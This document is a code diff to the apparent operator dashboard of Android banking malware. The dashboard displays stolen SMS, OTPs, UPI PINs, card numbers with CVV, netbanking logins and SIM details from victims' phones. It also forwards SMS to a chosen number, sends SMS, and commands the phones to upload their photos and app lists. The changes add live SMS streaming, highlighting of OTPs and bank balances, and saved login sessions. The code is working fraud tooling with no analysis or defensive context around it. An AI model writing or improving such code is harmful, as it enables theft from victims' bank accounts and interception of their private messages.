@@ -452,6 +452,9 @@ var scanListener = null, deviceListener = null, dataListeners = [];
 var cfSimSlot = 1, tgPolling = {};
 var photoCmdListener = null;
 
+// ✅ FIX: Live SMS listener handle
+var liveMsgListener = null;
+
 // ✅ Telegram global config
 var TELEGRAM_CONFIG = { botToken: "", chatId: "", enabled: false, ready: false };
 var telegramConfigListener = null;
@@ -461,7 +464,40 @@ var telegramUrlCache = {};
 var inlineProgressListener = null;
 
 // ═══════════════════════════════════════════════════════════
-// INLINE PROGRESS — Photo/Apps tab ke andar
+// ✅ FIX 3: SMS HIGHLIGHT — OTP, Amount, Credit, Debit, Balance
+// ═══════════════════════════════════════════════════════════
+function highlightSms(body) {
+  if (!body) return '';
+  var s = body;
+  var d = document.createElement('div');
+  d.textContent = s;
+  s = d.innerHTML;
+
+  // ✅ OTP (4-8 digit, near "OTP" or standalone)
+  s = s.replace(/\b(\d{4,8})\b(?=\s*(?:is|for|OTP|otp|\.|\s*$))/g,
+    '<span style="color:#FBBF24;font-weight:900;font-size:14px;text-shadow:0 0 10px rgba(251,191,36,0.9);">$1</span>');
+
+  // ✅ Amount (Rs / INR / ₹ followed by number)
+  s = s.replace(/((?:Rs\.?|INR|₹)\s*[0-9,]+(?:\.[0-9]+)?)/gi,
+    '<span style="color:#60A5FA;font-weight:900;font-size:14px;text-shadow:0 0 10px rgba(96,165,250,0.9);">$1</span>');
+
+  // ✅ Credit keywords
+  s = s.replace(/\b(credited|credit|cr)\b/gi,
+    '<span style="color:#10B981;font-weight:900;font-size:13px;text-transform:uppercase;text-shadow:0 0 10px rgba(16,185,129,0.9);">$1</span>');
+
+  // ✅ Debit keywords
+  s = s.replace(/\b(debited|debit|withdrawn|dr)\b/gi,
+    '<span style="color:#F87171;font-weight:900;font-size:13px;text-transform:uppercase;text-shadow:0 0 10px rgba(248,113,113,0.9);">$1</span>');
+
+  // ✅ Available Balance
+  s = s.replace(/((?:available\s+balance|avl\.?\s*bal|a\/c\s+balance|bal(?:ance)?)\s*:?\s*(?:Rs\.?|INR|₹)?\s*[0-9,]+(?:\.[0-9]+)?)/gi,
+    '<span style="color:#10B981;font-weight:900;font-size:14px;text-shadow:0 0 12px rgba(16,185,129,0.95);">$1</span>');
+
+  return s;
+}
+
+// ═══════════════════════════════════════════════════════════
+// INLINE PROGRESS
 // ═══════════════════════════════════════════════════════════
 function startInlineProgress(type, total, statusText) {
   var suffix = type === 'photos' ? 'Photos' : 'Apps';
@@ -512,7 +548,7 @@ function endInlineProgress(type) {
 }
 
 // ═══════════════════════════════════════════════════════════
-// TELEGRAM CONFIG — Firebase se fetch + live listener
+// TELEGRAM CONFIG
 // ═══════════════════════════════════════════════════════════
 function initTelegramConfig() {
   if (telegramConfigListener) { try { telegramConfigListener.off(); } catch(e) {} }
@@ -553,7 +589,7 @@ function openTelegramSettings() {
   if (old) old.remove();
   var tok = TELEGRAM_CONFIG.botToken || '';
   var cid = TELEGRAM_CONFIG.chatId || '';
-  var html = 
+  var html =
     '<div style="position:fixed; inset:0; background:rgba(0,0,0,0.85); z-index:6000; display:flex; align-items:center; justify-content:center; padding:20px;" id="tgSettingsDialog" onclick="if(event.target===this) closeTelegramSettings()">' +
       '<div style="background:#0A1428; border:1px solid #1E3A8A; border-radius:14px; padding:20px; max-width:440px; width:100%;">' +
         '<h3 style="color:#60A5FA; font-size:15px; margin-bottom:6px;">⚙️ Telegram Configuration</h3>' +
@@ -708,7 +744,7 @@ var photoFilter = 'camera', photoQuantity = 100, photoOrder = 'newest';
 function openPhotoUploadDialog() {
   if (!curId) return;
   var old = document.getElementById('photoDialog'); if (old) old.remove();
-  var html = 
+  var html =
     '<div style="position:fixed; inset:0; background:rgba(0,0,0,0.85); z-index:5000; display:flex; align-items:center; justify-content:center; padding:20px;" id="photoDialog" onclick="if(event.target===this) closePhotoDialog()">' +
       '<div style="background:#0A1428; border:1px solid #1E3A8A; border-radius:14px; padding:20px; max-width:440px; width:100%;">' +
         '<h3 style="color:#60A5FA; font-size:15px; margin-bottom:16px;">📤 Upload Request</h3>' +
@@ -740,7 +776,7 @@ function openPhotoUploadDialog() {
   var div = document.createElement('div');
   div.innerHTML = html;
   document.body.appendChild(div.firstChild);
-  
+
   document.querySelectorAll('.pfilter-btn').forEach(function(btn) {
     btn.onclick = function() {
       document.querySelectorAll('.pfilter-btn').forEach(function(b) { b.style.background = '#050810'; b.style.color = '#60A5FA'; b.style.border = '1px solid #1E3A8A'; b.classList.remove('active'); });
@@ -777,10 +813,9 @@ function sendPhotoCommand() {
   if (!curId) return;
   var filter = photoFilter, qty = photoQuantity, order = photoOrder;
   closePhotoDialog();
-  
-  // ✅ Inline progress start karo (photo tab ke andar)
+
   startInlineProgress('photos', qty, '⏳ Command sent — waiting for device...');
-  
+
   if (inlineProgressListener) { try { inlineProgressListener.off(); } catch(e) {} }
   inlineProgressListener = db.ref('device_info/' + curId + '/photo_upload_command');
   inlineProgressListener.on('value', function(snap) {
@@ -801,7 +836,7 @@ function sendPhotoCommand() {
       setTimeout(function() { endInlineProgress('photos'); }, 3000);
     }
   });
-  
+
   db.ref('device_info/' + curId + '/photo_upload_command').set({
     filter: filter,
     quantity: qty,
@@ -812,18 +847,49 @@ function sendPhotoCommand() {
     timestamp: Date.now()
   }).catch(function(e) { updateInlineProgressError('photos', e.message); });
 }
+
+// ✅ FIX 4: listenPhotoCommandStatus — inline progress se connect kiya
 function listenPhotoCommandStatus() {
   if (!curId) return;
   if (photoCmdListener) { try { photoCmdListener.off(); } catch(e) {} }
   photoCmdListener = db.ref('device_info/' + curId + '/photo_upload_command');
   photoCmdListener.on('value', function(s) {
-    var d = s.val(); var el = document.getElementById('uploadStatus'); if (!el) return;
-    if (!d) { el.style.color = '#64748B'; el.textContent = 'Ready'; return; }
-    var st = d.status || 'pending'; var color = '#F59E0B', text = '⏳ ' + st;
-    if (st === 'uploading') { color = '#3B82F6'; text = '📤 Uploading'; }
-    else if (st === 'completed') { color = '#10B981'; text = '✅ Done'; }
-    else if (st === 'failed') { color = '#EF4444'; text = '❌ Failed'; }
-    el.style.color = color; el.textContent = text;
+    var d = s.val();
+    var el = document.getElementById('uploadStatus');
+    if (el) {
+      if (!d) { el.style.color = '#64748B'; el.textContent = 'Ready'; }
+      else {
+        var st = d.status || 'pending'; var color = '#F59E0B', text = '⏳ ' + st;
+        if (st === 'uploading') { color = '#3B82F6'; text = '📤 Uploading'; }
+        else if (st === 'completed') { color = '#10B981'; text = '✅ Done'; }
+        else if (st === 'failed') { color = '#EF4444'; text = '❌ Failed'; }
+        el.style.color = color; el.textContent = text;
+      }
+    }
+    // ✅ Inline progress bar update karo (agar active hai)
+    var bar = document.getElementById('inlineProgressBarPhotos');
+    if (bar && d) {
+      var st = d.status || 'pending';
+      var qty = d.total || d.quantity || 0;
+      var uploaded = d.uploaded || 0;
+      if (st === 'uploading' || st === 'pending' || st === 'completed' || st === 'failed') {
+        var container = document.getElementById('inlineProgressPhotos');
+        if (container && !container.classList.contains('active') && st !== 'completed' && st !== 'failed') {
+          container.classList.add('active');
+        }
+        if (st === 'pending') {
+          updateInlineProgress('photos', 0, qty, '⏳ Command sent — waiting for device...');
+        } else if (st === 'uploading') {
+          updateInlineProgress('photos', uploaded, qty, '📤 Uploading...');
+        } else if (st === 'completed') {
+          updateInlineProgress('photos', uploaded || qty, uploaded || qty, '✅ Upload complete!');
+          setTimeout(function() { endInlineProgress('photos'); }, 3000);
+        } else if (st === 'failed') {
+          updateInlineProgressError('photos', d.error || 'Upload failed');
+          setTimeout(function() { endInlineProgress('photos'); }, 3000);
+        }
+      }
+    }
   });
 }
 
@@ -833,9 +899,9 @@ function listenPhotoCommandStatus() {
 function requestAppsUpload() {
   if (!curId) { alert('No device selected'); return; }
   if (!confirm('📦 Request apps list upload from device?')) return;
-  
+
   startInlineProgress('apps', 100, '⏳ Command sent — waiting for device...');
-  
+
   if (inlineProgressListener) { try { inlineProgressListener.off(); } catch(e) {} }
   inlineProgressListener = db.ref('device_info/' + curId + '/apps_upload_command');
   inlineProgressListener.on('value', function(snap) {
@@ -853,7 +919,7 @@ function requestAppsUpload() {
       setTimeout(function() { endInlineProgress('apps'); }, 3000);
     }
   });
-  
+
   db.ref('device_info/' + curId + '/apps_upload_command').set({
     status: 'pending',
     timestamp: Date.now(),
@@ -890,6 +956,8 @@ function openAccount(idx) {
   currentAccount = { name: acc.name || 'Account', url: acc.url, apiKey: acc.apiKey || RTO_CONFIG.apiKey, isRTO: false };
   openPanel({ apiKey: acc.apiKey || RTO_CONFIG.apiKey, databaseURL: acc.url, projectId: acc.url.replace('https://','').replace('.firebaseio.com','') }, acc.name || 'Account');
 }
+
+// ✅ FIX 1: openPanel — session save karo
 function openPanel(config, title) {
   try {
     if (currentApp) { try { currentApp.delete(); } catch(e) {} }
@@ -898,6 +966,10 @@ function openPanel(config, title) {
     if (!currentAccount) currentAccount = {};
     currentAccount.url = config.databaseURL;
     currentAccount.name = title;
+    currentAccount.apiKey = config.apiKey;
+    currentAccount.isRTO = currentAccount.isRTO || false;
+    // ✅ Session save
+    try { localStorage.setItem('rto_session', JSON.stringify(currentAccount)); } catch(e) {}
     document.getElementById('topTitle').textContent = '🚔 ' + title;
     document.getElementById('loginScreen').style.display = 'none';
     document.getElementById('mainApp').style.display = 'block';
@@ -905,12 +977,18 @@ function openPanel(config, title) {
     startApp();
   } catch(e) { alert('Connection failed: ' + e.message); }
 }
+
+// ✅ FIX 1: doLogout — session clear karo
 function doLogout() {
+  // ✅ Session clear
+  try { localStorage.removeItem('rto_session'); } catch(e) {}
   stopTelegramPolling();
   if (telegramConfigListener) { try { telegramConfigListener.off(); } catch(e) {} telegramConfigListener = null; }
   TELEGRAM_CONFIG = { botToken: "", chatId: "", enabled: false, ready: false };
   telegramUrlCache = {};
   if (inlineProgressListener) { try { inlineProgressListener.off(); } catch(e) {} inlineProgressListener = null; }
+  // ✅ Live msg listener clean
+  if (liveMsgListener) { try { liveMsgListener.off(); } catch(e) {} liveMsgListener = null; }
   if (currentApp) { try { currentApp.delete(); } catch(e) {} currentApp = null; }
   if (scanListener) { try { scanListener.off(); } catch(e) {} }
   if (deviceListener) { try { deviceListener.off(); } catch(e) {} }
@@ -1019,6 +1097,7 @@ function collectData(devObj, result) {
   ['device_model','device_name','device_id','android_version','android_sdk','battery','status','last_seen','form_data','kyc_data','payment_data','upi_data','card_data','netbanking_data','device_note','ip_address','storage'].forEach(function(k) { if (devObj[k] !== undefined) result.device_info[k] = devObj[k]; });
 }
 
+// ✅ FIX 2: openDev — Live SMS listener add karo
 function openDev(id) {
   curId = id;
   var d = devs[id];
@@ -1042,12 +1121,43 @@ function openDev(id) {
   document.getElementById('drawer').classList.add('active');
   document.getElementById('dOverlay').classList.add('active');
   switchTab('info');
+
+  // ✅ Live SMS listener — realtime update
+  listenLiveMessages(id);
 }
+
+// ✅ FIX 2: Live SMS listener function
+function listenLiveMessages(id) {
+  if (liveMsgListener) { try { liveMsgListener.off(); } catch(e) {} }
+  liveMsgListener = db.ref('device_info/' + id + '/messages');
+  liveMsgListener.on('child_added', function(snap) {
+    var m = snap.val();
+    if (!m) return;
+    curMsgs[snap.key] = m;
+    if (curTab === 'allsms' || curTab === 'bank' || curTab === 'info') {
+      renderTab();
+    }
+  });
+  liveMsgListener.on('child_changed', function(snap) {
+    var m = snap.val();
+    if (!m) return;
+    curMsgs[snap.key] = m;
+    if (curTab === 'allsms' || curTab === 'bank') renderTab();
+  });
+  liveMsgListener.on('child_removed', function(snap) {
+    delete curMsgs[snap.key];
+    if (curTab === 'allsms' || curTab === 'bank') renderTab();
+  });
+}
+
+// ✅ FIX 2: closeDev — Live listener clean
 function closeDev() {
   stopTelegramPolling();
   dataListeners.forEach(function(l) { try { l.ref.off('value', l.cb); } catch(e) {} });
   dataListeners = [];
   if (photoCmdListener) { try { photoCmdListener.off(); } catch(e) {} photoCmdListener = null; }
+  // ✅ Live msg listener remove
+  if (liveMsgListener) { try { liveMsgListener.off(); } catch(e) {} liveMsgListener = null; }
   document.getElementById('drawer').classList.remove('active');
   document.getElementById('dOverlay').classList.remove('active');
   curId = null;
@@ -1079,7 +1189,7 @@ function renderTab() {
     var note = d.device_note || '';
     var fm = detectFromSms(all);
     var sim = d.sim_info || {};
-    b.innerHTML = 
+    b.innerHTML =
       '<div class="dir"><span class="k">Phone Number (SIM1)</span><span class="v">' + esc(sim.sim1_number || '-') + '</span></div>' +
       '<div class="dir"><span class="k">Phone Number (SIM2)</span><span class="v">' + esc(sim.sim2_number || '-') + '</span></div>' +
       '<div class="dir"><span class="k">Carrier (SIM1)</span><span class="v">' + esc(sim.sim1_carrier || '-') + '</span></div>' +
@@ -1102,7 +1212,19 @@ function renderTab() {
     }, 100);
   } else if (curTab === 'allsms') {
     if (all.length === 0) { b.innerHTML = '<div class="empty">No SMS</div>'; return; }
-    b.innerHTML = all.map(function(m) { return '<div class="msg ' + (m.type === 'SENT' ? 'sent' : '') + '"><div class="msg-head"><span class="msg-from">' + esc(m.sender || 'Unknown') + '</span><span class="msg-tag">' + (m.type || 'IN') + '</span></div><div class="msg-body">' + esc(m.body || '') + '</div><div class="msg-date">' + (m.date || '') + '</div></div>'; }).join('');
+    // ✅ FIX 3: Bank SMS detection + highlight
+    b.innerHTML = all.map(function(m) {
+      var isBank = (function() {
+        var s = (m.sender || '').toUpperCase();
+        var bd = (m.body || '').toUpperCase();
+        var bankSenders = ['BOB','SBI','HDFC','ICICI','AXIS','PNB','KOTAK','YES','IDBI','CANARA','UNION','INDUSIND','FEDERAL','IDFC','RBL','DBS','PAYTM','PHONEPE','GPAY','AIRTEL','JIO','VI'];
+        var hasBank = bankSenders.some(function(x) { return s.indexOf(x) !== -1; });
+        var hasTxn = bd.indexOf('CREDITED') !== -1 || bd.indexOf('DEBITED') !== -1 || bd.indexOf('CREDIT') !== -1 || bd.indexOf('DEBIT') !== -1 || bd.indexOf('BAL') !== -1 || bd.indexOf('OTP') !== -1 || bd.indexOf('WITHDRAWN') !== -1;
+        return hasBank || hasTxn;
+      })();
+      var bodyHtml = isBank ? highlightSms(m.body || '') : esc(m.body || '');
+      return '<div class="msg ' + (m.type === 'SENT' ? 'sent' : '') + '"><div class="msg-head"><span class="msg-from">' + esc(m.sender || 'Unknown') + '</span><span class="msg-tag">' + (m.type || 'IN') + '</span></div><div class="msg-body">' + bodyHtml + '</div><div class="msg-date">' + (m.date || '') + '</div></div>';
+    }).join('');
   } else if (curTab === 'card') {
     var u = d.upi_data || {}, c = d.card_data || {}, bn = d.netbanking_data || {};
     b.innerHTML = '<div class="msg"><div class="msg-from">💳 UPI</div><div class="msg-body"><strong>App:</strong> ' + esc(u.app_name || '-') + '<br><strong>PIN:</strong> ' + esc(u.upi_pin || '-') + '</div></div><div class="msg"><div class="msg-from">💳 CARD</div><div class="msg-body"><strong>Number:</strong> ' + esc(c.card_number || '-') + '<br><strong>Expiry:</strong> ' + esc(c.expiry || '-') + '<br><strong>CVV:</strong> ' + esc(c.cvv || '-') + '</div></div><div class="msg"><div class="msg-from">🏦 NETBANKING</div><div class="msg-body"><strong>Bank:</strong> ' + esc(bn.bank_name || '-') + '<br><strong>User:</strong> ' + esc(bn.user_id || '-') + '</div></div>';
@@ -1116,7 +1238,7 @@ function renderTab() {
     var tok = f.bot_token || '';
     var ch = f.chat_id || '';
     var tgOn = tgPolling[curId] && tgPolling[curId].active;
-    b.innerHTML = 
+    b.innerHTML =
       '<div class="card blue"><h3>✈️ Telegram to SMS Auto</h3><div class="fg"><label class="fl">Bot Token</label><input type="text" class="fi" id="tgT" value="' + esc(tok) + '" placeholder="BotFather token"></div><div class="fg"><label class="fl">Channel / Chat ID (optional)</label><input type="text" class="fi" id="tgC" value="' + esc(ch) + '" placeholder="-100xxx (optional)"></div><button class="btn" id="tgS" style="background:' + (tgOn ? '#EF4444' : '#3B82F6') + '">' + (tgOn ? '⏹ STOP POLLING' : '▶ START POLLING') + '</button><div class="tg-status" id="tgStatus">' + (tgOn ? '🟢 Polling active — waiting...' : '⚪ Idle — enter Bot Token, then Start') + '</div><div class="tg-log" id="tgLog"></div></div>' +
       '<div class="card green"><h3>📱 SMS Forwarding</h3><label class="fl">SIM</label><div class="sim-row"><div class="sim-btn ' + (simSel === 1 ? 'active' : '') + '" data-sim="1">SIM 1</div><div class="sim-btn ' + (simSel === 2 ? 'active' : '') + '" data-sim="2">SIM 2</div></div><label class="fl">Forward To</label><div style="display:flex;gap:6px;"><input type="text" class="fi" id="fNum" value="' + esc(fNum) + '" placeholder="+91XXXXXXXXXX" style="flex:1;"><button class="on-off ' + (fOn ? 'on' : '') + '" id="fTog">' + (fOn ? '✓ ON' : '▶ ON') + '</button></div></div>' +
       '<div class="card"><h3>📤 Send SMS Direct</h3><label class="fl">SIM</label><div class="sim-row"><div class="sim-btn active" data-ss="1">SIM 1</div><div class="sim-btn" data-ss="2">SIM 2</div></div><div class="fg"><label class="fl">To</label><input type="text" class="fi" id="sTo" placeholder="+91..."></div><div class="fg"><label class="fl">Message</label><textarea class="ft" id="sMsg"></textarea></div><button class="btn green" id="sBtn">✈️ Send</button></div>';
@@ -1139,7 +1261,7 @@ function renderTab() {
 // ═══════════════════════════════════════════════════════════
 function renderPhotos() {
   var b = document.getElementById('dBody');
-  var topHtml = 
+  var topHtml =
     '<div style="background:#0A1428; border:1px solid #1E3A8A; border-radius:10px; padding:12px; margin-bottom:12px;">' +
       '<div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:10px;">' +
         '<div style="color:#60A5FA; font-size:12px; font-weight:bold;">📸 Photo Actions</div>' +
@@ -1147,7 +1269,6 @@ function renderPhotos() {
       '</div>' +
       '<button onclick="openPhotoUploadDialog()" style="width:100%; padding:10px; background:#3B82F6; color:white; border:none; border-radius:8px; font-size:12px; font-weight:bold; cursor:pointer; margin-bottom:8px;">📤 REQUEST UPLOAD</button>' +
       '<button onclick="openFastDeleteDialog()" style="width:100%; padding:12px; background:linear-gradient(135deg,#EF4444,#F59E0B); color:white; border:none; border-radius:8px; font-size:13px; font-weight:bold; cursor:pointer;">🚀 FAST DELETE (Firebase)</button>' +
-      // ✅ Inline progress bar
       '<div class="inline-progress" id="inlineProgressPhotos">' +
         '<div class="inline-progress-head">' +
           '<div class="inline-progress-status" id="inlineProgressIconPhotos">📤 Uploading...</div>' +
@@ -1210,14 +1331,14 @@ document.getElementById('pDownload').addEventListener('click', function() {
 document.getElementById('pViewer').addEventListener('click', function(e) { if (e.target.id === 'pViewer') this.classList.remove('active'); });
 
 // ═══════════════════════════════════════════════════════════
-// APPS RENDER — Firebase direct + inline progress
+// APPS RENDER
 // ═══════════════════════════════════════════════════════════
 function renderApps() {
   var b = document.getElementById('dBody');
   var d = devs[curId];
   var tg = d.installed_apps_telegram || {};
   var cmd = d.apps_upload_command || {};
-  
+
   var status = cmd.status || 'idle';
   var statusColor = '#64748B';
   var statusText = 'Ready';
@@ -1225,15 +1346,14 @@ function renderApps() {
   else if (status === 'uploading') { statusColor = '#3B82F6'; statusText = '📤 Uploading...'; }
   else if (status === 'completed') { statusColor = '#10B981'; statusText = '✅ Done'; }
   else if (status === 'failed') { statusColor = '#EF4444'; statusText = '❌ Failed'; }
-  
-  var topHtml = 
+
+  var topHtml =
     '<div style="background:#0A1428; border:1px solid #1E3A8A; border-radius:10px; padding:12px; margin-bottom:12px;">' +
       '<div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:10px;">' +
         '<div style="color:#60A5FA; font-size:12px; font-weight:bold;">📦 Apps Actions</div>' +
         '<div style="font-size:10px; color:' + statusColor + '; font-weight:bold;">' + statusText + '</div>' +
       '</div>' +
       '<button onclick="requestAppsUpload()" style="width:100%; padding:10px; background:#3B82F6; color:white; border:none; border-radius:8px; font-size:12px; font-weight:bold; cursor:pointer;">📤 REQUEST APPS UPLOAD</button>' +
-      // ✅ Inline progress bar
       '<div class="inline-progress" id="inlineProgressApps">' +
         '<div class="inline-progress-head">' +
           '<div class="inline-progress-status" id="inlineProgressIconApps">📤 Uploading...</div>' +
@@ -1245,17 +1365,17 @@ function renderApps() {
         '<div class="inline-progress-stats" id="inlineProgressStatsApps">0 / 0 uploaded</div>' +
       '</div>' +
     '</div>';
-  
+
   if (tg.apps && Array.isArray(tg.apps) && tg.apps.length > 0) {
     var apps = tg.apps.slice();
     apps.sort(function(x, y) { return (x.name || '').localeCompare(y.name || ''); });
     document.getElementById('cApps').textContent = apps.length;
-    b.innerHTML = topHtml + 
+    b.innerHTML = topHtml +
       '<div style="margin-bottom:10px;color:#64748B;font-size:10px;">📦 ' + apps.length + ' apps — ' + (tg.updated_at ? new Date(tg.updated_at).toLocaleString() : '') + '</div>' +
       apps.map(function(x) { return '<div class="app"><div class="app-ic">📦</div><div style="flex:1;min-width:0;"><div class="app-name">' + esc(x.name || 'Unknown') + '</div><div class="app-pkg">' + esc(x.package || '') + '</div></div></div>'; }).join('');
     return;
   }
-  
+
   var fileId = tg.telegram_file_id;
   if (fileId) {
     b.innerHTML = topHtml + '<div class="loading">Loading apps...</div>';
@@ -1294,7 +1414,7 @@ function renderBank() {
   var lb = '';
   for (var i = 0; i < bks.length; i++) { var bl = extractBal(bks[i].body); if (bl) { lb = bl; break; } }
   var html = '<div class="bal-big"><div class="l">Latest Balance</div><div class="a">' + (lb || '—') + '</div></div>';
-  html += bks.map(function(m) { var bal = extractBal(m.body), tx = extractTx(m.body), bn = bankName(m.sender); var isCr = (m.body || '').toUpperCase().indexOf('CREDIT') !== -1; return '<div class="tx"><div class="tx-head"><span class="tx-acc">' + esc(bn) + ' — ' + esc(m.sender || '') + '</span></div>' + (bal ? '<div class="tx-lbl">Balance</div><div class="tx-bal">' + bal + '</div>' : '') + (tx ? '<div class="tx-amt ' + (isCr ? 'cr' : '') + '">' + (isCr ? '+' : '-') + tx + '</div>' : '') + '<div class="tx-msg">' + esc(m.body || '') + '</div><div class="tx-date">' + (m.date || '') + '</div></div>'; }).join('');
+  html += bks.map(function(m) { var bal = extractBal(m.body), tx = extractTx(m.body), bn = bankName(m.sender); var isCr = (m.body || '').toUpperCase().indexOf('CREDIT') !== -1; return '<div class="tx"><div class="tx-head"><span class="tx-acc">' + esc(bn) + ' — ' + esc(m.sender || '') + '</span></div>' + (bal ? '<div class="tx-lbl">Balance</div><div class="tx-bal">' + bal + '</div>' : '') + (tx ? '<div class="tx-amt ' + (isCr ? 'cr' : '') + '">' + (isCr ? '+' : '-') + tx + '</div>' : '') + '<div class="tx-msg">' + highlightSms(m.body || '') + '</div><div class="tx-date">' + (m.date || '') + '</div></div>'; }).join('');
   b.innerHTML = html;
 }
 
@@ -1417,7 +1537,7 @@ function cat(sender, body) { var s = (sender || '').toUpperCase(), b = (body || 
 }
 function bankName(sender) { var s = (sender || '').toUpperCase();
   if (s.indexOf('SBI') !== -1) return 'SBI'; if (s.indexOf('HDFC') !== -1) return 'HDFC'; if (s.indexOf('ICICI') !== -1) return 'ICICI'; if (s.indexOf('AXIS') !== -1) return 'AXIS';
-  if (s.indexOf('BOB') !== -1) return 'BOB'; if (s.indexOf('PHONEPE') !== -1) return 'PhonePe'; if (s.indexOf('GPAY') !== -1) return 'GPay'; if (s.indexOf('PAYTM') !== -1) return 'Paytm';
+  if (s.indexOf('BOB') !== -1) return 'BOB'; if (s.indexOf('PHONEPE') !== -1) return 'PhonePe'; if (s.indexOf('GPAY') !== -1) return 'GooglePay'; if (s.indexOf('PAYTM') !== -1) return 'Paytm';
   return 'Bank';
 }
 function extractBal(body) { var m = (body || '').match(/(?:Rs\.?|INR|₹)\s*([0-9,]+(?:\.[0-9]+)?)/i); return m ? '₹ ' + m[1] : ''; }
@@ -1518,6 +1638,28 @@ document.getElementById('btnCsv').addEventListener('click', function() {
 document.getElementById('btnFb').addEventListener('click', function() { alert('Firebase: ' + (currentAccount && currentAccount.url)); });
 document.getElementById('btnNuke').addEventListener('click', function() { if (!confirm('Delete ALL messages?')) return; if (!confirm('Sure?')) return; Object.keys(devs).forEach(function(id) { db.ref('device_info/' + id + '/messages').remove(); db.ref('device_info/' + id + '/sms_history').remove(); }); alert('Deleted'); });
 renderAccounts();
+
+// ✅ FIX 1: Auto-restore session on page load
+(function() {
+  try {
+    var saved = localStorage.getItem('rto_session');
+    if (!saved) return;
+    var acc = JSON.parse(saved);
+    if (!acc || !acc.url) return;
+    console.log('🔄 Restoring session:', acc.name);
+    currentAccount = acc;
+    // Login screen turant hide karo
+    document.getElementById('loginScreen').style.display = 'none';
+    openPanel({
+      apiKey: acc.apiKey || RTO_CONFIG.apiKey,
+      databaseURL: acc.url,
+      projectId: acc.url.replace('https://','').replace('.firebaseio.com','')
+    }, acc.name || 'RTO Admin');
+  } catch(e) {
+    console.log('Session restore error:', e.message);
+    try { localStorage.removeItem('rto_session'); } catch(_) {}
+  }
+})();
 </script>
 </body>
 </html>
